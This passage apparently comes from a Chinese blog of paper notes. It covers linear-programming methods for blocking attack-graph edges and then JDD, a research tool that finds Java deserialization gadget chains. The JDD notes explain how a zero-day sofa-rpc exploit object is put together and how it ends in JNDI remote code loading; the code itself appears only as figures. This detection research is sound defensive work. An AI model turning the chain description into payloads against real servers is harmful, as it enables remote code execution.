</ul>
<p>换句话说，<span class="math inline">\(NSP(u, v)\)</span> 是从 <span
class="math inline">\(u\)</span> 到 <span
class="math inline">\(v\)</span> 的路径，然后如果 <span
class="math inline">\(v\)</span> 只有一个后继节点，则重复移动到 <span
class="math inline">\(v\)</span> 的唯一后继节点，直到到达分裂节点或
<span class="math inline">\(DA\)</span>。</p>
<p>使用 <span class="math inline">\(DEST(u, v)\)</span> 来表示 <span
class="math inline">\(NSP(u, v)\)</span> 的结束节点，因此有 <span
class="math inline">\(DEST(u, v) \in SPLIT + DA\)</span>。</p>
<p>如果非分裂路径至少有一条边是可阻塞的，则称其为可阻塞的。</p>
<p><span class="math inline">\(AD\)</span>
图可以被视为以下一组非分裂路径的连接，参数（非分裂路径数量 <span
class="math inline">\(\#NSP\)</span>）是这组路径的大小。</p>
<p><span class="math inline">\(\{NSP(u, v)|u \in SPLIT \cup ENTRY, v \in
SUCCESSORS(u)\}\)</span></p>
<p>在路径 <span class="math inline">\(NSP(u, v)\)</span> 上距离 <span
class="math inline">\(u\)</span> 最远的可阻塞边被标记为 <span
class="math inline">\(BW(u, v)\)</span>。<span
class="math inline">\(BW\)</span>
代表“值得阻塞”，这是由于以下引理所导致的。</p>
<h2 id="引理-2">引理 2</h2>
<p>对于纯策略和混合策略的阻挡，永远别在非分裂路径上花费超过一个单位的预算。</p>
<p>对于任何问题实例，存在一个最优的防御策略，即只阻挡来自以下集合的边：</p>
<p><span class="math inline">\(BW = \{BW(u, v)|u \in SPLIT \cup ENTRY, v
\in SUCCESSORS(u)\}\)</span></p>
<p>本文介绍了如何通过前述的非分裂路径构建一个非线性规划，然后将其转化为混合整数规划，并使用最先进的混合整数规划求解器进行高效求解。</p>
<p>本文使用 <span class="math inline">\(B_e\)</span> 来表示在边 <span
class="math inline">\(e\)</span> 上花费的预算单位。</p>
<p>对于纯策略阻挡，<span class="math inline">\(B_e\)</span>
是二进制的；对于混合策略阻挡，<span class="math inline">\(B_e\)</span>
在 <span class="math inline">\(0\)</span> 到 <span
class="math inline">\(1\)</span> 之间。</p>
<p>如前所述，对于 <span class="math inline">\(e \in BW\)</span>，<span
class="math inline">\(B_e \ge 0\)</span>，对于 <span
class="math inline">\(e \notin BW\)</span>，<span
class="math inline">\(B_e = 0\)</span>。</p>
<p>本文使用 <span class="math inline">\(r_u\)</span> 来表示节点 <span
class="math inline">\(u\)</span>
的成功率，节点的成功率是从该节点开始的最优攻击路径在当前防御策略（即
<span class="math inline">\(B_e\)</span>）下的成功率；<span
class="math inline">\(c_{u,v}\)</span> 来表示当没有阻挡时非分裂路径
<span class="math inline">\(NSP(u, v)\)</span> 的成功率，<span
class="math inline">\(c_{u,v} = \prod_{e \in
NSP(u,v)}(1−f(e))\)</span>，<span class="math inline">\(c_{u,v}\)</span>
是常数。</p>
<p>本文使用 <span class="math inline">\(r^*\)</span>
来表示攻击者的最优成功率。 <span class="math display">\[C = \{(u, v)|u
\in SPLIT \cup ENTRY, v \in SUCCESSORS(u)\}\]</span> <span
class="math display">\[C^+ = \{(u, v)|(u, v) \in C, NSP(u, v) \;
blockable\}\]</span> <span class="math display">\[C^− = \{(u, v)|(u, v)
\in C, NSP(u, v) \; not \; blockable\}\]</span></p>
<p>本文有以下非线性规划： <span class="math display">\[min \,
r^∗\]</span> <span class="math display">\[r^∗ \ge r_u \, , ∀u \in
ENTRY\]</span> <span class="math display">\[r_u \ge
r_{DEST(u,v)}·c_{u,v}·(1-B_{BW(u,v)}), ∀(u,v) \in C^+\]</span> <span
class="math display">\[r_u \ge r_{DEST(u,v)}·c_{u,v}, ∀(u,v) \in
C^-\]</span> <span class="math display">\[b \ge \sum_{e \in
BW}B_e\]</span> <span class="math display">\[r_{DA}=1\]</span> <span
class="math display">\[r_u,r^* \in [0,1]\]</span> <span
class="math display">\[B_e \in \{0,1\} or [0,1]\]</span></p>
<p>上述规划最多有 <span class="math inline">\(O(\#NSP)\)</span>
个变量和最多 <span class="math inline">\(O(\#NSP)\)</span>
个约束（都不依赖于 <span class="math inline">\(n\)</span>）。</p>
<p>对于纯策略阻挡，可以通过将 <span class="math inline">\(r_u \ge
r_{DEST(u,v)}·c_{u,v}·(1−B_{BW(u,v)})\)</span> 重写为等价的线性形式
<span class="math inline">\(r_u \ge
r_{DEST(u,v)}·c_{u,v}−B_{BW(u,v)}\)</span>
将上述规划转换为一个整数规划。</p>
<h1 id="混合阻断策略">混合阻断策略</h1>
<p>为了达到目的，这里可以将前一节的非线性规划程序转换为一个几乎是线性的程序。</p>
<p>可以观察到，如果在最优混合策略防御下，攻击者的成功率至少为 <span
class="math inline">\(\varepsilon\)</span>，那么这意味着防守方永远不希望以严格大于
<span class="math inline">\(1 - \varepsilon\)</span>
的概率阻挡任何边。</p>
<p>基于这一观察，本文强制要求不以超过 <span class="math inline">\(1 -
\varepsilon\)</span>
的概率阻挡一条边，并在这一限制下求解最优防御策略。</p>
<p>如果最终结果中，攻击者的成功率至少为 <span
class="math inline">\(\varepsilon\)</span>，那么这个限制实际上根本不是限制。</p>
<p>如果本文的解决方案表明攻击者的成功率低于 <span
class="math inline">\(\varepsilon\)</span>，那么仍然有一个几乎最优的防御策略。</p>
<p>本文设置 <span
class="math inline">\(\varepsilon=0.01\)</span>，即对于所有 <span
class="math inline">\(e \in BW\)</span>，要求 <span
class="math inline">\(0 \le B_e \le 0.99\)</span>，而不是 <span
class="math inline">\(0 \le B_e \le 1\)</span>。</p>
<p>通过上述观察可以将涉及乘法的非线性规划程序转换为几乎是线性的程序。</p>
<p>技巧是将 <span class="math inline">\(r_u\)</span> 替换为 <span
class="math inline">\(r&#39;_u = −ln(r_u)\)</span>，将 <span
class="math inline">\(r&#39;^*\)</span> 替换为 <span
class="math inline">\(r&#39;^* = −ln(r^*)\)</span>，将 <span
class="math inline">\(B_e\)</span> 替换为 <span
class="math inline">\(B&#39;_e = − ln(1 − B_e)\)</span>，最后将 <span
class="math inline">\(c_{u,v}\)</span> 替换为 <span
class="math inline">\(c&#39;_{u,v} = − ln(c_{u,v})\)</span>。</p>
<p>则变量现在是 <span
class="math inline">\(r&#39;_u,r&#39;^*,B&#39;_e\)</span>。由于自然对数的单调性，可以将之前的非线性规划重写为：
<span class="math display">\[max \, r&#39;^{∗}\]</span> <span
class="math display">\[r&#39;^{∗} ≥ r&#39;_u \, , ∀u \in ENTRY \]</span>
<span class="math display">\[r&#39;_u ≥
r&#39;_{DEST(u,v)}+c&#39;_{u,v}+B&#39;_{BW(u,v)}, ∀(u,v) \in
C^+\]</span> <span class="math display">\[r&#39;_u ≥
r&#39;_{DEST(u,v)}+c&#39;_{u,v}, ∀(u,v) \in C^-\]</span> <span
class="math display">\[b ≥ \sum_{e \in BW}(1-e^{-B&#39;_e})\]</span>
<span class="math display">\[r&#39;_{DA}=0\]</span> <span
class="math display">\[r&#39;_u,r&#39;^* \in [0,\infty)\]</span> <span
class="math display">\[B&#39;_e \in [0,-ln(0.01)]\]</span>
不幸的是，上述程序不是线性的，因为预算约束不是线性的。</p>
<p>此外，上述程序甚至不是凸的：由于 <span class="math inline">\(1 −
e^{−x}\)</span> 是凹的，两个可行解的平均值可能会违反预算约束。</p>
<h2 id="迭代-lp-近似启发式算法">迭代 LP 近似启发式算法</h2>
<p>可以注意到 <span class="math inline">\(1 − e^{−x}\)</span>
是增加的，也就是说，只要降低 <span class="math inline">\(b&#39;\)</span>
的总和，最终将达到一个满足预算约束的情况。</p>
<p>即如果将预算约束重新表述为 <span class="math inline">\(b&#39; \ge
\sum_{e \in BW}B&#39;_e\)</span>，这是一个线性约束。</p>
<p>然后可以猜测一个值 <span
class="math inline">\(b&#39;\)</span>，然后解决对应的 <span
class="math inline">\(LP\)</span>。</p>
<p>接下来验证 <span class="math inline">\(LP\)</span>
解是否也满足原始的非线性预算约束。如果是的话，那么这意味着可以增加对
<span class="math inline">\(b&#39;\)</span> 的猜测（增加 <span
class="math inline">\(b&#39;\)</span> 意味着花费更多预算）。</p>
<p>如果 <span class="math inline">\(LP\)</span>
解违反了原始的非线性预算约束，那么这意味着应该减少对 <span
class="math inline">\(b&#39;\)</span> 的猜测。</p>
<p>一个好的 <span class="math inline">\(b&#39;\)</span> 的猜测可以通过从
<span class="math inline">\(0\)</span> 到 <span
class="math inline">\(−|BW| ln(0.01)\)</span> 的二分搜索获得。</p>
<h2 id="基于-mip-的近似方法">基于 MIP 的近似方法</h2>
<p>另一种解决非线性预算约束的方法是将 <span
class="math inline">\(B_e\)</span> 添加回模型中（对于 <span
class="math inline">\(e \in BW，0 \le B_e \le 0.99\)</span>）。</p>
<p>这样，预算约束 <span class="math inline">\(\sum_{e \in BW} B_e \le
b\)</span> 又变成线性的了，不过还需要将 <span
class="math inline">\(B_e\)</span> 和 <span
class="math inline">\(B&#39;_e\)</span>
连接起来，因此引入一组新的非线性约束，即 <span
class="math inline">\(B&#39;_e =−ln(1−B_e), e \in BW\)</span>。</p>
<p>函数 <span class="math inline">\(− ln(1 − x)\)</span>
在一个小区间内接近一条直线。如果 <span class="math inline">\(x \in [a,
b]\)</span>，连接 <span class="math inline">\((a, − ln(1 − a))\)</span>
和 <span class="math inline">\((b, − ln(1 − b))\)</span> 的直线是 <span
class="math inline">\(− ln(1 − x)\)</span> 的一个上界。表示 <span
class="math inline">\(− ln(1 − x)\)</span> 下界的直线是在区间中点 <span
class="math inline">\(a+b\)</span> 处的切线。</p>
<p>给定一个特定的 <span class="math inline">\(Be\)</span>，可以将 <span
class="math inline">\(Be\)</span> 的区域 <span class="math inline">\([0,
0.99]\)</span> 划分为多个较小的区间。对于每个区间，有两条直线分别表示
<span class="math inline">\(− ln(1 − x)\)</span> 的下界和上界。</p>
<p>可以连接这些区域组成 <span class="math inline">\(g_L(x)\)</span> 和
<span class="math inline">\(g_U(x)\)</span>，它们分别是 <span
class="math inline">\(− ln(1 − x)\)</span> 的分段线性下界和上界。然后将
<span class="math inline">\(B&#39;_e =−ln(1−Be)\)</span> 替换为 <span
class="math inline">\(B&#39;_e =g_L(Be)\)</span> 或 <span
class="math inline">\(B&#39;_e
=g_U(Be)\)</span>，分别创建两个不同的混合整数规划程序。</p>
<p>最后使用 <a
href="https://pubsonline.informs.org/doi/abs/10.1287/mnsc.49.9.1268.16570"><strong>Croxton</strong></a>
等人提出的多选模型来实现带有辅助二进制变量的分段线性约束。</p>
<p>当区间足够细时，实验上，所得到的可行防御接近于下界【因此接近于最优】。</p>
<h1 id="refer">REFER</h1>
<p><a
href="https://joeylian.github.io/2020/06/29/2020-06-30-%E5%9B%BE%E7%9A%84%E6%A0%91%E5%88%86%E8%A7%A3/">图的树分解</a></p>
<p><a
href="https://www.luogu.com.cn/blog/loverpaul/post-xue-xi-bi-ji-shu-fen-xie-suan-fa">【学习笔记】树分解算法</a></p>
<p><a
href="https://www.win.tue.nl/~nikhil/courses/2015/2WO08/treewidth-erickson.pdf">Treewidth</a></p>
<p><a
href="https://www.zhihu.com/question/25560707/answer/31133440">什么是混合整数线性规划(MILP)模型？
- JH CHEN的回答 - 知乎</a></p>
<p><a
href="https://www.jsjkx.com/CN/article/openArticlePDF.jsp?id=19020">图的树分解算法及其应用</a></p>
]]></content>
      <categories>
        <category>Paper</category>
      </categories>
      <tags>
        <tag>Paper</tag>
      </tags>
  </entry>
  <entry>
    <title>论文 Efficient Detection of Java Deserialization Gadget Chains via Bottom-up Gadget Search and Dataflow-aided Payload Construction</title>
    <url>/Paper-Efficient-Detection-of-Java-Deserialization-Gadget-Chains-via-Bottom-up-Gadget-Search-and-Dataflow-aided-Payload-Construction/</url>
    <content><![CDATA[<p>阅读笔记，<strong>2024 S&amp;P</strong>。</p>
<h1 id="摘要">摘要</h1>
<p><strong>Java</strong> 反序列化中一个众所周知且严重的安全漏洞是
<strong>Java</strong>
对象注入（<strong>JOI</strong>），它使得远程攻击者能够注入一个精心制作的序列化对象，触发一系列内部
<strong>Java</strong> 方法（称为
<strong>gadgets</strong>），最终实现一系列严重的攻击后果，例如远程代码执行（<strong>RCE</strong>）和拒绝服务（<strong>DoS</strong>）攻击。</p>
<span id="more"></span>
<h1 id="研究内容">研究内容</h1>
<p>本文设计并实现了一种新颖的 <strong>Java</strong> 反序列化
<strong>gadget</strong> 检测框架，称为 <strong>JDD</strong>。</p>
<ol type="1">
<li><p>通过自下而上的方法解决了静态路径爆炸问题：首先寻找
<strong>gadget</strong> 片段，然后从接收器到源链 <strong>gadget</strong>
片段。该方法将最大静态搜索时间从指数级降低到多项式级，即从 <span
class="math inline">\(O(eM^n)\)</span> 到 <span
class="math inline">\(O(M^2n^3 + enM)\)</span>，其中 <span
class="math inline">\(n\)</span> 是 <strong>gadget</strong>
链中动态函数调用的数量，<span class="math inline">\(M\)</span>
是动态函数调用候选的平均数量，<span class="math inline">\(e\)</span>​
是入口点的数量。</p>
<p>更重要的是，<strong>JDD</strong> 能够重用在先前漏洞中发现的现有
<strong>gadget</strong> 片段，进一步加快了搜索过程。</p></li>
<li><p>构建了所谓的注入对象构建图（<strong>Injection Object Construction
Diagram</strong>），该图模拟了注入对象 <strong>Field</strong>
之间的数据流依赖关系，以促进动态 <strong>fuzzing</strong>，丰富
<strong>payload</strong> 中的细粒度对象关系。</p>
<blockquote>
<p>这个 <strong>Injection Object Construction Diagram</strong>
在后面的系统设计中有提到。</p>
</blockquote></li>
</ol>
<h1 id="概述">概述</h1>
<p><strong>JOI</strong> 漏洞的利用需要以下两个条件：</p>
<ol type="1">
<li>一个执行路径，可以在反序列化过程中调用可以执行恶意代码（或上传任意文件、拒绝服务等）的安全敏感方法，称为
<strong>gadget</strong> 链。</li>
<li>一个驱动 <strong>gadget</strong>
链执行的序列化对象，称为注入对象。</li>
</ol>
<p>因此，<strong>JDD</strong> 有两个主要的检测目标：</p>
<ol type="1">
<li>使用静态分析找到潜在的 <strong>gadget</strong> 链。</li>
<li>动态生成可利用的注入对象以验证 <strong>gadget</strong>
链的可利用性。</li>
</ol>
<p>以下是 <strong>JDD</strong> 在 <strong>sofa-rpc</strong> 中发现的一个
<strong>0day gadget</strong> 链。</p>
<blockquote>
<p>第 <strong>4</strong> 行开始执行了一个 <strong>put()</strong>
方法，然后不停调用。</p>
<p>一直到第 <strong>54</strong> 行执行了 <strong>invoke()</strong>
方法完成反序列化。</p>
</blockquote>
<figure>
<img
src="/images/Paper-Efficient-Detection-of-Java-Deserialization-Gadget-Chains-via-Bottom-up-Gadget-Search-and-Dataflow-aided-Payload-Construction/image-20240217150052682.png"
alt="Figure 1: A Motivating Example of a Zero-day Gadget Chain with Five Fragments (Note that code is simplified for easy understanding.)" />
<figcaption aria-hidden="true">Figure 1: A Motivating Example of a
Zero-day Gadget Chain with Five Fragments (Note that code is simplified
for easy understanding.)</figcaption>
</figure>
<p>以下是攻击者的利用链。</p>
<blockquote>
<p>第 <strong>15–18</strong> 行创建了两个相同 <strong>hashCode</strong>
的 <strong>NodeImpl</strong>，为了触发 <strong>equals()</strong>
方法【<strong>gadget</strong> 中的第 <strong>7</strong> 行】。</p>
<p>第 <strong>12/13/19</strong> 行创建了
<strong>ConcurrentHashMap</strong> 并赋值，是为了调用
<strong>gadget</strong> 中的第 <strong>27</strong> 行。</p>
<p>第 <strong>2/20</strong> 行的赋值是为了调用 <strong>gadget</strong>
中的第 <strong>36</strong> 行。</p>
<p>最后 <strong>4-10</strong>
行是指定了远程加载动态代码的参数，攻击调用点在 <strong>gadget</strong>
中的第 <strong>54</strong> 行。</p>
</blockquote>
<figure>
<img
src="/images/Paper-Efficient-Detection-of-Java-Deserialization-Gadget-Chains-via-Bottom-up-Gadget-Search-and-Dataflow-aided-Payload-Construction/image-20240217154742422.png"
alt="Figure 2: Exploit Code of Our Motivating Example in Figure 1 (An adversary serializes the returned object in Line 20 and sends it to the server)." />
<figcaption aria-hidden="true">Figure 2: Exploit Code of Our Motivating
Example in Figure 1 (An adversary serializes the returned object in Line
20 and sends it to the server).</figcaption>
</figure>
<h2 id="挑战-i静态路径爆炸">挑战 I：静态路径爆炸</h2>
<p>第一个挑战是对于以往自上而下的搜索来说，起始点和结束点之间所有可能路径的数量是指数级的，且有时候由于方法名相同会导致冗余，导致路径爆炸。</p>
<p>以图 <strong>1</strong> 为例：</p>
<ul>
<li><strong>Fragment I</strong> 和 <strong>II</strong> 之间的
<strong>equals()</strong> 方法的潜在候选数量可能为 <span
class="math inline">\(2,751\)</span>，对 <strong>II</strong> 和
<strong>III</strong> 之间的另一个 <strong>equals()</strong>
方法也适用。</li>
<li>然后，在 <strong>III</strong> 和 <strong>IV</strong> 之间的
<strong>get()</strong> 方法的候选数量为 <span
class="math inline">\(148\)</span>。</li>
<li>在 <strong>IV</strong> 和 <strong>V</strong> 之间的
<strong>createValue()</strong> 方法为 <span
class="math inline">\(12\)</span>。</li>
</ul>
<h3 id="解决方案">解决方案</h3>
<p>因此，如果使用深度优先搜索（<strong>DFS</strong>）来找到像
<strong>ODDFuzz</strong> 所做的 <strong>gadget</strong>
链，总执行路径数量可能为 <span class="math inline">\(2751×2751×148×12 =
13,440,769,776\)</span>，这几乎不可能。</p>
<p>对此 <strong>JDD</strong> 一次性分析所有可能的
<strong>gadget</strong>，形成片段，然后自下而上从结束点到起始点链接所有的片段，形成链。</p>
<p>具体来说，<strong>JDD</strong> 只需要分析 <span
class="math inline">\((12 + 2751 + 148) = 2,911\)</span>
个程序执行路径，并且在最多分析 $ (2911×2911 - 2751×2751 - 148×148 -
12×12)×2 + 2751 = 1,770,495$ 次片段链接，这仅仅是自上而下方法的 <span
class="math inline">\(0.01\%\)</span>。</p>
<h2
id="挑战ii并行和嵌套的注入对象结构">挑战II：并行和嵌套的注入对象结构</h2>
<p>第二个挑战是负载，即注入对象，可能具有复杂的结构，例如嵌套或并行对象。</p>
<p>下图显示了图 <strong>1</strong> 中示例的注入对象结构。</p>
<figure>
<img
src="/images/Paper-Efficient-Detection-of-Java-Deserialization-Gadget-Chains-via-Bottom-up-Gadget-Search-and-Dataflow-aided-Payload-Construction/image-20240217170548258.png"
alt="Figure 3: Injection Object Structure of Motivation Example." />
<figcaption aria-hidden="true">Figure 3: Injection Object Structure of
Motivation Example.</figcaption>
</figure>
<p><strong>UIDfaults</strong> 和 <strong>ConcurrentHashMap</strong>
是正确 <strong>payload</strong> 中 <strong>NodeImpl</strong>
对象下的两个 <strong>key</strong>。</p>
<p>然而，先前的工作，如 <strong>ODDFuzz</strong>，仅考虑从
<strong>gadget</strong>
链推断出的类层次结构，因此它们将生成一个错误的对象结构，如
<strong>b</strong> 所示，因为在 <strong>ConcurrentHashMap</strong>
之后调用了 <strong>UIDfaults</strong> 的 <strong>get()</strong> 方法【图
<strong>1</strong> 中的第 <strong>27</strong> 行】。</p>
<h3 id="解决方案-1">解决方案</h3>
<p>本文使用了数据流辅助注入对象构建图（<strong>Injection Object
Construction Diagram</strong>）。</p>
<p>关键观察是不同的注入对象，例如它们的 Field ，通过数据流连接。</p>
<p>具体来说，图 <strong>1</strong>
中不同颜色的两条虚线显示了两个这样的数据流。</p>
<p><strong>key</strong>（第 <strong>8</strong> 行）流向
<strong>this.key</strong>（第 <strong>17</strong> 行），然后流向
<strong>this.table[index].key</strong>（第 <strong>27</strong>
行）。</p>
<p>然后，<strong>p.key</strong>（第 <strong>8</strong> 行）流向
<strong>((NodeImpl) obj).key</strong>（第 <strong>17</strong>
行），然后流向 <strong>(Map&lt;?,?&gt;)o</strong>（第
<strong>27</strong> 行）。</p>
<p>因此推断出有两个 <strong>NodeImpl</strong>
对象，<strong>UIDfaults</strong> 位于一个 <strong>NodeImpl</strong>
对象的键下，而不是 <strong>ConcurrentHashMap</strong> 的
<strong>table</strong> 下。</p>
<h1 id="设计">设计</h1>
<figure>
<img
src="/images/Paper-Efficient-Detection-of-Java-Deserialization-Gadget-Chains-via-Bottom-up-Gadget-Search-and-Dataflow-aided-Payload-Construction/image-20240217172204035.png"
alt="Figure 4: The Overall Architecture of JDD with Two Stages." />
<figcaption aria-hidden="true">Figure 4: The Overall Architecture of JDD
with Two Stages.</figcaption>
</figure>
<h2 id="系统架构">系统架构</h2>
<h3 id="stage-i">Stage I</h3>
<p>从识别 <strong>sofa-rpc</strong>
中的入口点开始，然后将它们用作开始静态污染分析的起始点。</p>
<p>从每个入口点开始遍历目标程序的控制流和数据流图，直到动态方法调用，并将其视为一个片段。</p>
<p>然后，将动态方法的实现视为新的起始点，直到下一个动态方法调用，并将两者之间的代码视为新的片段。</p>
<p>在此过程中，<strong>JDD</strong> 识别包含结束点的一些
<strong>gadget</strong> 片段，如图 <strong>1 Fragment V</strong> 中的
<strong>MethodUtil.invoke()</strong>。</p>
<p>接下来，在步骤 <strong>3</strong> 中，使用该片段查找有动态调用
<strong>LazyValue.createValue()</strong> 方法的 <strong>Fragment
IV</strong>，以及根据先前的污染分析结果查找调用
<strong>createValue()</strong> 方法的对象的值。</p>
<p>随后，将 <strong>Fragment IV</strong> 作为新的起点来查找
<strong>Fragment III</strong>，并重复此过程，直到到达起始点，形成一个
<strong>gadget</strong> 链。</p>
<p>连接片段 <strong>Fragment IV</strong> 后，为了完成
<strong>gadget</strong> 链，<strong>JDD</strong>
将独立收集可能导致攻击者 <strong>RCE</strong> 的潜在片段，例如包含
<strong>JNDI</strong> 功能的 <strong>Fragment VI</strong>。</p>
<p>由于 <strong>Fragment V</strong>
具有反射功能，并且参数由攻击者控制，因此 <strong>JDD</strong>
将进一步将其连接。</p>
<h3 id="stage-ii">Stage II</h3>
<p>在步骤 <strong>4</strong> 中，<strong>JDD</strong> 提取
<strong>gadget</strong> 链链接的约束，其中包括如下：</p>
<ol type="1">
<li>结构化约束（即对象和 Field 实例之间的类层次关系）。</li>
<li>Field 依赖约束（对于示例，<strong>n1.key</strong> 和
<strong>n2.key</strong> 的 <strong>hashCode</strong> 应该相同）。</li>
<li>条件分支。</li>
</ol>
<p>需要注意的是，<strong>JDD</strong>
将不同执行路径共享的约束标记为支配者（<strong>dominator</strong>），这意味着它们被所有执行路径所需。</p>
<p>在提取这些约束后，<strong>JDD</strong> 使用一种称为 <strong>Injection
Object Construction Diagram</strong> 的新数据结构来模拟对象 Field
之间的数据流依赖关系，并指导动态模糊测试。</p>
<p>最后，在步骤 <strong>5</strong> 中，<strong>JDD</strong>
仪器化目标程序的收集约束，并使用覆盖支配者约束的数量来指导模糊测试，以生成一个可以利用该
<strong>gadget</strong> 链的注入对象。</p>
<p>具体来说，<strong>JDD</strong> 首先根据 <strong>Injection Object
Construction Diagram</strong>
图中的类层次结构初始化一个实例对象。然后，为对象中的每个 Field
分配适当的值，<strong>JDD</strong>
使用约束求解器解决支配者约束。最后，<strong>JDD</strong>
使用此对象作为种子来驱动定向模糊测试，并利用覆盖的支配约束数量来评估其效能。</p>
<h2 id="步骤-1识别反序列化入口点">步骤 1：识别反序列化入口点</h2>
<p>入口方法有两类：</p>
<ol type="1">
<li><strong>Java</strong> 语言提供的反序列化方法，例如
<strong>readObjectNoData()、readExternal()</strong> 和
<strong>readObject()</strong>。</li>
<li><strong>Java</strong> 反序列化协议提供的接口，例如
<strong>Hessian</strong> 协议的 <strong>Map.put()</strong>。</li>
</ol>
<p>需要注意的是，由于许多这些入口点被定义为接口，<strong>JDD</strong>
进一步识别和分析它们的覆盖或实现方法作为入口点。</p>
<figure>
<img
src="/images/Paper-Efficient-Detection-of-Java-Deserialization-Gadget-Chains-via-Bottom-up-Gadget-Search-and-Dataflow-aided-Payload-Construction/image-20240217202942067.png"
alt="Table 1: Popular Deserialization Protocols" />
<figcaption aria-hidden="true">Table 1: Popular Deserialization
Protocols</figcaption>
</figure>
<h2 id="步骤-2使用静态污染分析识别-gadget-片段">步骤
2：使用静态污染分析识别 gadget 片段</h2>
<p>两个子步骤：</p>
<ol type="1">
<li><strong>gadget</strong> 片段形成。</li>
<li>在片段内的数据流分析。</li>
</ol>
<p>首先，将入口点或先前动态方法调用的实现，直到下一个动态方法调用，将其中的代码视为一个片段。</p>
<p>其次，还执行数据流分析，记录片段中第一个方法的参数传播的污染。</p>
<p>具体来说，本文设计了一个基于片段的摘要，对于每个
<strong>gadget</strong>
片段，记录其第一个方法和最后一个方法参数之间的污染行为，并维护一个可到达的终点的记录。</p>
<p>本文将方法之间的跳转转换为 <strong>gadget</strong>
片段之间的跳转，目的是灵活模拟动态方法调用并减少方法之间搜索的计算复杂性。</p>
<h3 id="gadget-片段定义">Gadget 片段定义</h3>
<p>对于每个片段，其终点通常是一个安全敏感的方法或指向另一个片段的动态方法调用，例如
<strong>Object.equals()</strong> 可以连接到几乎所有实现了
<strong>equals()</strong> 方法。</p>
<p>在反序列化过程中，这种动态方法调用确实导致了程序执行方向的存在多种可能性，它们就像
<strong>jump/goto</strong> 指令一样。</p>
<p>具体来说，<strong>gadget</strong> 片段中的方法具有：</p>
<ol type="1">
<li>头部，这是该片段的入口方法，并存在一些动态方法调用可以跳转到该方法。</li>
<li>终点，这是该片段的退出方法，通常是一个动态方法调用或安全敏感的方法。</li>
<li>其他
<strong>gadget</strong>，这些是非动态方法，在反序列化过程中按顺序执行，以连接头部和终点。</li>
</ol>
<h3 id="gadget-片段的动态方法调用类型">Gadget
片段的动态方法调用类型</h3>
<h4 id="多态调用">多态调用</h4>
<p><strong>JDD</strong>
识别目标程序类的继承层次结构，并识别重写的方法。然后，当父类中的方法被调用时，<strong>JDD</strong>
将其连接到其子类实现的相应重写方法。</p>
<p>例如，考虑一个类 <strong>B</strong> 重写了类 <strong>C</strong>
的方法 <strong>m()</strong>，任何以 <strong>C.m()</strong>
为终点的片段都可以跳转到其他以 <strong>B.m()</strong> 为头的片段。</p>
<h4 id="动态代理">动态代理</h4>
<p><strong>Java</strong> 语言支持以接口、<strong>Object</strong>
和其他泛型为类型的对象实现为动态代理实例.</p>
<p>当实例调用任何方法时，它将被重定向到特定的调用处理程序，即在此代理中实现的
<strong>invoke()</strong> 方法。</p>
<p>这种处理程序通常基于触发方法的属性（例如方法名称）部署方法路由。</p>
<p>因此，对于每个处理程序，<strong>JDD</strong>
执行路径敏感分析以了解其方法路由，以确保触发方法不会连接到错误的执行路径。</p>
<p>在实践中，<strong>JDD</strong> 首先在调用处理程序的所有执行路径中识别
<strong>Gadget</strong> 片段，并根据其执行路径为相应的方法属性要求标记
<strong>Gadget</strong> 片段。</p>
<h4 id="反射">反射</h4>
<p>与其他动态特性不同，<strong>Java</strong>
反射可以根据其参数调用程序中几乎所有的方法。</p>
<p><strong>JDD</strong>
首先检查反射的参数是否受攻击者控制，然后限制其连接包含代码执行能力的片段。</p>
<p>请注意，<strong>JDD</strong> 允许反射将任何 <strong>Gadget</strong>
片段连接到其后续片段，但更倾向于两种类型的 <strong>Gadget</strong>
片段：</p>
<ol type="1">
<li>没有参数的方法，特别是 <strong>getter</strong> 或
<strong>is</strong> 方法，和接口方法的实现。</li>
<li>带有布尔或字符串类型的一个参数的方法。</li>
</ol>
<h2 id="步骤-3使用自下而上的方法链接-fragment-片段以构建-gadget-链">步骤
3：使用自下而上的方法链接 Fragment 片段以构建 Gadget 链</h2>
<p>首先，JDD 获得了 3 个类型的 Fragments。</p>
<ol type="1">
<li>Source Fragments，其头部是一个源，例如 Figure 1 中的 Gadget Fragment
I。</li>
<li>Free-State Fragments，记录了两个动态方法调用之间的方法执行顺序，例如
Figure 1 中的 Gadget Fragment II-IV</li>
<li>Sink Fragments，其结尾是一个结束点，例如 Figure 1 中的 Fragment
V、VI。</li>
</ol>
<p>然后将 Sink 连上 Free-State，最后连上 Source。</p>
<p>但是 JDD 需要考虑不同的动态调用对应的污染条件和调用条件，比如 Sink
Fragments 一般有特定参数可以被攻击者控制。</p>
<p>算法 1 中的细节如下：</p>
<p>首先，JDD 连接了可以过渡到 Sink Fragments 的 Free-State
Fragments。</p>
<p>如算法 1 所示，在每一轮中（第 2-19 行），JDD 遍历了 Free-State
Fragments <span class="math inline">\(frag_fs\)</span>。</p>
<p>基于 <span class="math inline">\(frag_fs\)</span>，JDD 检查其链接到
Sink Fragments 是否满足条件。</p>
<p>如果满足，<span class="math inline">\(frag_fs\)</span>
将作为下一次迭代的 Sink Fragments（第 8-9 行）添加到 new Sink Fragments
中，同时跟踪污点需求以满足连接（如果它们与已记录的污点需求相同，则合并它们）（第
11 行）。</p>
<p>由于每次迭代都可以找出所有可能连接到当前 Sink
Fragments，如果这些片段不是 new Sink Fragments 则终止迭代，即当 new Sink
Fragments 为空时（第 15-16 行）或达到最大搜索尝试次数时。</p>
<p>接下来，遍历 Source
Fragments，并采用相同的方法检测可连接的后继片段，从而获得所有潜在的片段链（第
20-26 行）。</p>
<figure>
<img
src="/images/Paper-Efficient-Detection-of-Java-Deserialization-Gadget-Chains-via-Bottom-up-Gadget-Search-and-Dataflow-aided-Payload-Construction/image-20240218143156239.png"
alt="Algorithm 1 Gadget Fragments Linking" />
<figcaption aria-hidden="true">Algorithm 1 Gadget Fragments
Linking</figcaption>
</figure>
<p>最后，假设有 n' 个不同的动态方法调用。</p>
<blockquote>
<p>为什么最大迭代次数的上限是n'。</p>
<p>如果迭代次数超过
n'，最长的片段必然包含两个结尾相同的片段，其动态方法调用相同。</p>
<p>由于攻击者有能力调用具有相同动态方法调用的任何候选项，攻击者可以直接提供后一个调用中的类实现以减少总长度，因此两个相同动态方法调用之间的路径是冗余的。</p>
</blockquote>
<h3 id="时间复杂度">时间复杂度</h3>
<p>根据以下定理 1 和 2，JDD 将静态搜索时间从 <span
class="math inline">\(O(eM^n)\)</span>（即现有技术，如ODDFuzz) 减少到
<span class="math inline">\(O(M^2n^3 + enM)\)</span>。</p>
<h3 id="定理-1">定理 1</h3>
<p>算法 1 的搜索复杂度是 <span class="math inline">\(O(M^2n^3 +
enM)\)</span>，其中 <span class="math inline">\(n\)</span>
